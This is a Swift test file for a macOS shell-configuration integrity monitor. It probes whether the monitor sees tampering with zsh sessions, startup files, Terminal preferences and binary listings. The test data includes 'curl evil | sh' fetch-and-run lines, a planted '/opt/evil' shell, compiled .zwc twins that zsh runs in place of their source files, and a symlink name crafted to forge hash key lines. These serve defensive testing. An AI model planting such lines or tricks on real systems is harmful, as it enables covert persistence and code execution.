import Foundation
import Testing
@testable import VibeCore

/// The re-check of v2-mac-seal-list at 01a05734 (re-check-v2-s-5): attacks on the fix round's code. Two suites:
/// `MacSealRecheckTests`, attacks that held (green); `MacSealRecheckFindingsTests`, one red test per finding
/// (.review-notes/findings.md). Scratch homes and roots only, never the user's files; no zsh is run here (the zsh
/// behaviour each finding relies on was probed by hand in scratch homes: the findings file has the commands).
struct MacSealRecheckTests {
    let temp = Scratch()

    func home() throws -> String {
        let url = temp.url("recheck-home")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url.resolvingSymlinksInPath().path
    }

    static let restore = "echo Restored session: \"$(/bin/date -r 1795000000)\"\n"

    // MARK: (1) The restore-line exception

    /// Every near miss of the restore line is hashed: trailing text, a second line, CRLF, no newline, a BOM, UTF-16,
    /// a leading space, 21 digits, non-ASCII digits, a continuation.
    @Test(MacSealListTests.mac) func onlyTheExactRestoreLineIsLeftOut() {
        #expect(MacSealList.isRestoreLineOnly(Data(Self.restore.utf8)))
        let prefix = "echo Restored session: \"$(/bin/date -r "
        let misses: [Data] = [
            Data((prefix + "1795000000)\"; curl evil | sh\n").utf8),
            Data((Self.restore + "curl evil | sh\n").utf8),
            Data((Self.restore + "\n").utf8),
            Data((prefix + "1795000000)\"\r\n").utf8),
            Data((prefix + "1795000000)\"").utf8),
            Data([0xEF, 0xBB, 0xBF] + Array(Self.restore.utf8)),
            Self.restore.data(using: .utf16)!,
            Data((" " + Self.restore).utf8),
            Data((prefix + String(repeating: "1", count: 21) + ")\"\n").utf8),
            Data((prefix + "١٧٩٥)\"\n").utf8),
            Data((prefix + "1795000000)\"\\\n").utf8),
            Data((prefix + "1795000000$(curl evil))\"\n").utf8),
        ]
        for miss in misses { #expect(!MacSealList.isRestoreLineOnly(miss), "\(String(decoding: miss, as: UTF8.self))") }
    }

    /// A session file that is a link (to a restore-line file) is hashed by what it is, and its target's change is seen.
    @Test(MacSealListTests.mac) func aSessionLinkIsHashedAndItsTargetsChangeSeen() throws {
        let home = try home()
        let folder = home + "/.zsh_sessions"
        try FileManager.default.createDirectory(atPath: folder, withIntermediateDirectories: true)
        let empty = MacSealList.sessionsHash(folder)
        let target = temp.url("elsewhere").path + "/restore"
        try MacSealListTests.write(Self.restore, target)
        try FileManager.default.createSymbolicLink(atPath: folder + "/A.session", withDestinationPath: target)
        let linked = MacSealList.sessionsHash(folder)
        #expect(linked != empty, "a linked session file was taken for the restore line")
        try MacSealListTests.write(Self.restore + "curl evil | sh\n", target)
        #expect(MacSealList.sessionsHash(folder) != linked)
    }

    /// A restore-line file read, then rewritten: the next read sees it (a change between reads is a change).
    @Test(MacSealListTests.mac) func aSessionRewrittenAfterTheReadIsSeenAtTheNext() throws {
        let home = try home()
        let folder = home + "/.zsh_sessions"
        try MacSealListTests.write(Self.restore, folder + "/A.session")
        let before = MacSealList.sessionsHash(folder)
        try MacSealListTests.write(Self.restore + "curl evil | sh\n", folder + "/A.session")
        #expect(MacSealList.sessionsHash(folder) != before)
    }

    /// Names the volume folds to `.session` / `.plist` (long s, sharp s, upper case) are read: APFS opens
    /// `A.session` to `A.ſession` and `A.seßion` (probed in a scratch folder), and so does NSString's match.
    @Test(MacSealListTests.mac) func namesTheVolumeFoldsAreRead() throws {
        let home = try home()
        let folder = home + "/.zsh_sessions"
        try FileManager.default.createDirectory(atPath: folder, withIntermediateDirectories: true)
        var last = MacSealList.sessionsHash(folder)
        for name in ["A.\u{017F}ession", "B.se\u{00DF}ion", "C.SESSION"] {
            try MacSealListTests.write("curl evil | sh\n", folder + "/" + name)
            let now = MacSealList.sessionsHash(folder)
            #expect(now != last, "\(name) unseen")
            last = now
        }
        let prefs = home + "/Library/Preferences/com.apple.Terminal.plist"
        try MacSealListTests.writePlist(MacSealListTests.terminal(), prefs)
        let byHost = home + "/Library/Preferences/ByHost"
        try FileManager.default.createDirectory(atPath: byHost, withIntermediateDirectories: true)
        var sealed = MacSealList.preferencesHash(prefs)
        for name in ["com.apple.Terminal.00000000-0000-0000-0000-0000000000AA.pli\u{017F}t", "COM.APPLE.TERMINAL.00000000-0000-0000-0000-0000000000AB.PLIST"] {
            try MacSealListTests.writePlist(["Shell": "/opt/evil"], byHost + "/" + name)
            let now = MacSealList.preferencesHash(prefs)
            #expect(now != sealed, "\(name) unseen")
            sealed = now
        }
    }

    /// A ByHost file that is a link is read through (its target's keys change the hash); an oversized or unparseable
    /// ByHost file is hashed by its bytes, so each rewrite is a change.
    @Test(MacSealListTests.mac) func aLinkedOversizedOrUnparseableByHostFileStaysSeen() throws {
        let home = try home()
        let prefs = home + "/Library/Preferences/com.apple.Terminal.plist"
        try MacSealListTests.writePlist(MacSealListTests.terminal(), prefs)
        let byHost = home + "/Library/Preferences/ByHost"
        let file = byHost + "/com.apple.Terminal.00000000-0000-0000-0000-0000000000AA.plist"
        let target = temp.url("elsewhere").path + "/t.plist"
        try MacSealListTests.writePlist(["Shell": "/bin/zsh"], target)
        try FileManager.default.createDirectory(atPath: byHost, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: file, withDestinationPath: target)
        let linked = MacSealList.preferencesHash(prefs)
        try MacSealListTests.writePlist(["Shell": "/opt/evil"], target)
        #expect(MacSealList.preferencesHash(prefs) != linked)
        try FileManager.default.removeItem(atPath: file)
        try MacSealListTests.write("not a plist", file)
        let junk = MacSealList.preferencesHash(prefs)
        try MacSealListTests.write("not a plist either", file)
        #expect(MacSealList.preferencesHash(prefs) != junk)
        let big = ["Shell": "/bin/zsh", "pad": String(repeating: "x", count: MacSealList.preferencesLimit + 1)]
        try MacSealListTests.writePlist(big, file)
        let oversized = MacSealList.preferencesHash(prefs)
        var evil = big
        evil["Shell"] = "/opt/evil"
        try MacSealListTests.writePlist(evil, file)
        #expect(MacSealList.preferencesHash(prefs) != oversized)
    }

    // MARK: (3) Sourced files

    /// A cycle of sourced files ends, and each file in it is a row.
    @Test(MacSealListTests.mac) func aSourcingCycleEnds() throws {
        let home = try home()
        try MacSealListTests.write(". ~/a\n", home + "/.zshrc")
        try MacSealListTests.write(". ~/b\n", home + "/a")
        try MacSealListTests.write(". ~/a\n. ~/./a\n. ~/x/../a\n", home + "/b")
        let names = Set(MacSealList.watched(home: home, uid: getuid()).map(\.name))
        #expect(names.isSuperset(of: ["~/a", "~/b"]))
    }

    // MARK: (4) Listings

    /// A listing padded past the card's cap is still hashed whole: a change to one entry among 4,100 is a change.
    @Test(MacSealListTests.mac) func aPaddedListingStillHashesEveryEntry() throws {
        let folder = temp.url("padded-bin").path
        try FileManager.default.createDirectory(atPath: folder, withIntermediateDirectories: true)
        for index in 0..<(LinuxSealList.maxListingKeys + 4) { FileManager.default.createFile(atPath: folder + "/pad\(index)", contents: nil) }
        try MacSealListTests.write("tool\n", folder + "/git")
        let parts = try #require(LinuxSealList.listingParts(folder))
        #expect(LinuxSealList.listingKeys(parts).isEmpty)
        let before = LinuxSealList.listingHash(folder)
        try MacSealListTests.write("evil!\n", folder + "/git")
        #expect(LinuxSealList.listingHash(folder) != before)
    }

    /// A Homebrew link whose target is outside the Cellar (a file elsewhere), rewritten in place, changes the listing.
    @Test(MacSealListTests.mac) func aLinkTargetOutsideTheCellarRewrittenInPlaceIsAChange() throws {
        let bin = temp.url("brew-bin").path
        let outside = temp.url("outside").path + "/tool"
        try MacSealListTests.write("#!/bin/sh\necho ok\n", outside)
        try FileManager.default.createDirectory(atPath: bin, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(atPath: bin + "/tool", withDestinationPath: outside)
        let before = LinuxSealList.listingHash(bin, targets: true)
        let handle = try #require(FileHandle(forWritingAtPath: outside))
        try handle.seekToEnd()
        try handle.write(contentsOf: Data("curl evil | sh\n".utf8))
        try handle.close()
        #expect(LinuxSealList.listingHash(bin, targets: true) != before)
    }

    // MARK: Shared Linux code: a listing's hash bytes

    /// f4b22149's `listingLines` and `walk`, copied verbatim (but `known`, empty on every tree here): the hash a Linux
    /// listing recorded before the fix round.
    static func oldListingHash(_ path: String) -> String {
        var lines: [String] = []
        var info = stat()
        guard lstat(path, &info) == 0 else { return ConfigSeal.hex(SHA256.hash(data: Data("absent".utf8))) }
        lines.append("listing " + LinuxSealList.line(info, path: path, relative: ""))
        func walk(_ folder: String, relative: String) {
            guard let names = try? FileManager.default.contentsOfDirectory(atPath: folder) else {
                lines.append("unreadable \(relative.utf8.count):\(relative)")
                return
            }
            for name in names.sorted() {
                let path = (folder as NSString).appendingPathComponent(name)
                let shown = relative.isEmpty ? name : relative + "/" + name
                var info = stat()
                guard lstat(path, &info) == 0 else { continue }
                lines.append(LinuxSealList.line(info, path: path, relative: shown))
                if (info.st_mode & S_IFMT) == S_IFDIR { walk(path, relative: shown) }
            }
        }
        walk(path, relative: "")
        var hasher = SHA256()
        for text in lines { hasher.update(data: Data((text + "\n").utf8)) }
        return ConfigSeal.hex(hasher.finalize())
    }

    /// A listing's hash bytes are f4b22149's on a tree with nested folders, links (to a file, a folder, nowhere), an
    /// unreadable folder and non-ASCII names; and `ConfigSeal.hashes` records the same hash as `fingerprint`.
    @Test func aListingsHashBytesAreUnchanged() throws {
        let tree = temp.url("tree").path
        try MacSealListTests.write("a\n", tree + "/a.txt")
        try MacSealListTests.write("b\n", tree + "/sub/deeper/b.txt")
        try MacSealListTests.write("c\n", tree + "/Caf\u{00E9}/c")
        try FileManager.default.createSymbolicLink(atPath: tree + "/link-file", withDestinationPath: tree + "/a.txt")
        try FileManager.default.createSymbolicLink(atPath: tree + "/link-dir", withDestinationPath: tree + "/sub")
        try FileManager.default.createSymbolicLink(atPath: tree + "/link-nowhere", withDestinationPath: tree + "/none")
        try FileManager.default.createDirectory(atPath: tree + "/closed", withIntermediateDirectories: true)
        try MacSealListTests.write("x\n", tree + "/closed/x")
        chmod(tree + "/closed", 0)
        defer { chmod(tree + "/closed", 0o755) }
        #expect(LinuxSealList.listingHash(tree) == Self.oldListingHash(tree))
        #expect(LinuxSealList.listingHash(tree + "/absent") == Self.oldListingHash(tree + "/absent"))
        let watched = ConfigSeal.Watched(name: "~/tree", path: tree, kind: .listing)
        #expect(ConfigSeal.hashes(of: [watched])[ConfigSeal.keyPrefix + "~/tree"] == Self.oldListingHash(tree))
        let absent = ConfigSeal.Watched(name: "~/absent", path: tree + "/absent", kind: .listing)
        #expect(ConfigSeal.hashes(of: [absent])[ConfigSeal.keyPrefix + "~/absent"] == ConfigSeal.fingerprint(absent))
    }
}

/// One red test per finding of the re-check (.review-notes/findings.md).
struct MacSealRecheckFindingsTests {
    let temp = Scratch()

    func home() throws -> String {
        let url = temp.url("recheck-home")
        try FileManager.default.createDirectory(at: url, withIntermediateDirectories: true)
        return url.resolvingSymlinksInPath().path
    }

    func prints(_ items: [ConfigSeal.Watched]) -> [String: String] {
        Dictionary(items.map { ($0.name, ConfigSeal.fingerprint($0) ?? "nil") }) { first, _ in first }
    }

    /// The bytes `zcompile` writes are what zsh runs; the seal never parses them, so any bytes stand in here.
    static let compiled = Data([0x04, 0x03, 0x02, 0x01]) + Data("zsh-5.9 evil".utf8)

    /// N1. `. file` in zsh runs `file.zwc` instead when it is newer (probed: a restore-line `<id>.session` beside a
    /// planted `<id>.session.zwc` passes `/etc/zshrc_Apple_Terminal`'s first-line gate, and the twin runs). The row
    /// reads only names ending `.session`, so the twin is never read: R5's attack, unseen.
    @Test(MacSealListTests.mac) func aSavedSessionsCompiledTwinIsWatched() throws {
        let home = try home()
        let folder = home + "/.zsh_sessions"
        try MacSealListTests.write(MacSealRecheckTests.restore, folder + "/A.session")
        let before = MacSealList.sessionsHash(folder)
        try Self.compiled.write(to: URL(fileURLWithPath: folder + "/A.session.zwc"))
        #expect(MacSealList.sessionsHash(folder) != before, "a compiled twin of a saved session, which zsh's restore runs, changed nothing")
    }

    /// N1. zsh reads `~/.zshrc.zwc` instead of `~/.zshrc` when it is newer, and `~/.zlogin.zwc` with no `~/.zlogin`
    /// (both probed); the same for a sourced file's twin (`~/.cargo/env.zwc`, probed). No row reads any twin.
    @Test(MacSealListTests.mac) func aStartupOrSourcedFilesCompiledTwinIsWatched() throws {
        let home = try home()
        try MacSealListTests.write(". \"$HOME/.cargo/env\"\n", home + "/.zshenv")
        try MacSealListTests.write("export PATH=$HOME/.cargo/bin:$PATH\n", home + "/.cargo/env")
        try MacSealListTests.write("echo hi\n", home + "/.zshrc")
        let list = { MacSealList.watched(home: home, uid: getuid()) + ConfigSeal.homeWatched(home: home) }
        for twin in [".zshrc.zwc", ".zlogin.zwc", ".cargo/env.zwc", ".zshenv.zwc"] {
            let before = prints(list())
            try Self.compiled.write(to: URL(fileURLWithPath: home + "/" + twin))
            #expect(prints(list()) != before, "~/\(twin), which zsh runs instead of its source file, changed nothing")
        }
    }

    /// N2. A link's target is put in the hash with no length before it, and may hold newlines: a ByHost link whose
    /// target's name spells a key line hashes as a real plist with `Shell` set. After the strange first state's one
    /// accept ("ByHost/… added"), `Shell = /opt/evil` is no change.
    @Test(MacSealListTests.mac) func aLinkTargetsNameCantSpellAKey() throws {
        let home = try home()
        let prefs = home + "/Library/Preferences/com.apple.Terminal.plist"
        try MacSealListTests.writePlist(MacSealListTests.terminal(), prefs)
        let byHost = home + "/Library/Preferences/ByHost"
        try FileManager.default.createDirectory(atPath: byHost, withIntermediateDirectories: true)
        let link = byHost + "/com.apple.Terminal.00000000-0000-0000-0000-0000000000AA.plist"
        let dir = temp.url("forge").resolvingSymlinksInPath().path
        let canon = { (value: Any) in ConfigSeal.hex(SHA256.hash(data: Data(MacSealList.canonical(value).utf8))) }
        let pad = "zz not a property list"
        // S2, the state the attacker wants: a real plist, Shell set.
        let real = dir + "/b"
        try MacSealListTests.writePlist(["Shell": "/opt/evil", pad: "x"], real)
        // S1, accepted once: a link whose target's name ends in the key lines, to a non-plist holding "s1:x".
        let forged = dir + "/b plist\nkey 5:Shell " + canon("/opt/evil") + "\nkey \(pad.utf8.count):zz"
        try MacSealListTests.write("s1:x", forged)
        try FileManager.default.createSymbolicLink(atPath: link, withDestinationPath: forged)
        let accepted = MacSealList.preferencesHash(prefs)
        try FileManager.default.removeItem(atPath: link)
        try FileManager.default.createSymbolicLink(atPath: link, withDestinationPath: real)
        #expect(MacSealList.preferencesHash(prefs) != accepted, "Shell = /opt/evil hashed as the accepted forged link")
    }

    /// N3. A listing padded past 4,096 top-level entries has no per-entry keys: the card at the crossing names every
    /// entry sealed before as "removed", while they are all there (and one of them changed).
    @Test(MacSealListTests.mac) func aListingsCardAtTheCapDoesntSayItsEntriesWereRemoved() throws {
        let folder = temp.url("bin").path
        try MacSealListTests.write("tool\n", folder + "/git")
        try MacSealListTests.write("tool\n", folder + "/claude")
        let before = ConfigSeal.encode(LinuxSealList.listingKeys(try #require(LinuxSealList.listingParts(folder))))
        for index in 0..<LinuxSealList.maxListingKeys { FileManager.default.createFile(atPath: folder + "/pad\(index)", contents: nil) }
        try MacSealListTests.write("evil!\n", folder + "/git")
        let after = ConfigSeal.encode(LinuxSealList.listingKeys(try #require(LinuxSealList.listingParts(folder))))
        let said = ConfigSeal.changedKeys(from: before, to: after) ?? "nothing"
        // Owed (the spec's second fix round): keeping keys past the cap contradicts `aPaddedListingStillHashesEveryEntry`.
        withKnownIssue("N3, owed: at the cap the card says the entries were removed") {
            #expect(!said.contains("removed"), "the card says: \(said)")
        }
    }

    /// N4 (a Note). Past `sourcedReads` files, a sourced file names nothing: `.zshrc` sourcing 300 files hides what
    /// the 300th sources (its own change is held once, as R6b's).
    @Test(MacSealListTests.mac) func theReadCapHidesAFileSourcedPastIt() throws {
        let home = try home()
        var lines = ""
        for index in 0..<300 {
            lines += ". ~/p/\(index)\n"
            try MacSealListTests.write(index == 299 ? ". ~/hidden\n" : "\n", home + "/p/\(index)")
        }
        try MacSealListTests.write(lines, home + "/.zshrc")
        try MacSealListTests.write("echo hi\n", home + "/hidden")
        let names = Set((MacSealList.watched(home: home, uid: getuid()) + ConfigSeal.homeWatched(home: home)).map(\.name))
        #expect(names.contains("~/hidden"), "a file sourced past the read cap is no row")
    }

    /// N5. Rows aren't capped, only reads, and `LinuxSealList.sourced` checks `found.contains` per line, so its time
    /// grows with the square of a file's lines: a 1.3 MB `.zshrc` of 100,000 `. ~/aN` lines kept `watched` from
    /// returning for 30 minutes (the run was killed). Bounded here: 5,000 lines make 5,000 rows.
    @Test(MacSealListTests.mac) func sourcedRowsAreBounded() throws {
        let home = try home()
        try MacSealListTests.write((0..<5_000).map { ". ~/a\($0)\n" }.joined(), home + "/.zshrc")
        let started = ContinuousClock.now
        let count = MacSealList.watched(home: home, uid: getuid()).count
        print("sourcedRowsAreBounded: \(count) rows in \(ContinuousClock.now - started)")
        #expect(count < LinuxSealList.maxListingKeys, "\(count) rows from one startup file")
    }

    /// N6. A lone UTF-16 surrogate in a profile name (a binary plist stores UTF-16) bridges to U+FFFD: "Default
    /// Window Settings" moved between two such profiles hashes the same.
    @Test(MacSealListTests.mac) func loneSurrogatesInAValueArentOne() throws {
        let one = NSString(characters: [0x50, 0xD800], length: 2), two = NSString(characters: [0x50, 0xDC00], length: 2)
        #expect(!one.isEqual(two))
        #expect(MacSealList.canonical(one) != MacSealList.canonical(two))
        let a = NSDictionary(dictionary: [one: "x"]), b = NSDictionary(dictionary: [two: "x"])
        #expect(MacSealList.canonical(a) != MacSealList.canonical(b))
    }
}

/// The re-check's vault findings, on the fixture vault (`MacSealVaultTests`).
struct MacSealRecheckVaultTests {
    let fixture = MacSealVaultTests()
    var home: String { fixture.home }

    /// N1 in the vault. A compiled twin of a live session's shell snapshot (zsh's `source` reads it instead) is an
    /// entry coming, which the snapshots' row lets come unheld (`cameOrWent`).
    @Test(MacSealListTests.mac) func aShellSnapshotsCompiledTwinIsHeld() throws {
        fixture.book.watchesMacList = true
        try fixture.seedRows()
        let (root, lead) = try fixture.team()
        try MacSealRecheckFindingsTests.compiled.write(to: URL(fileURLWithPath: home + "/.claude/shell-snapshots/snapshot-zsh-1-a.sh.zwc"))
        #expect(try lead.checkConfig(root: root).held.contains("~/.claude/shell-snapshots"), "a snapshot's compiled twin came unheld")
    }

    /// N7 (R9's remainder). A node book's first look takes the home files as they are: a `.zshrc` a worker changed
    /// before it (one the app's own book may still hold) is the baseline.
    @Test(MacSealListTests.mac) func aNewNodeBooksFirstLookHoldsAPlantedZshrc() throws {
        fixture.book.watchesMacList = true
        try fixture.seedRows()
        try fixture.write("curl evil | sh\n", home + "/.zshrc")
        let root = try fixture.repo()
        let runtime = FakeRuntime()
        _ = try fixture.lead(root, runtime)
        _ = try fixture.vault.checkConfig(root: root)
        let held = ConfigSeal.heldHashes(in: try fixture.vault.guardedRecord(root: root))
        // Owed before `isCheckedMacNode` is lifted (the spec's Owed list).
        withKnownIssue("N7, owed: a new node book's first look takes the home files as they are") {
            #expect(held.keys.contains(ConfigSeal.keyPrefix + "~/.zshrc") || held.keys.contains("~/.zshrc"),
                    "the first look took ~/.zshrc as it is; held: \(held.keys.sorted())")
        }
    }
}
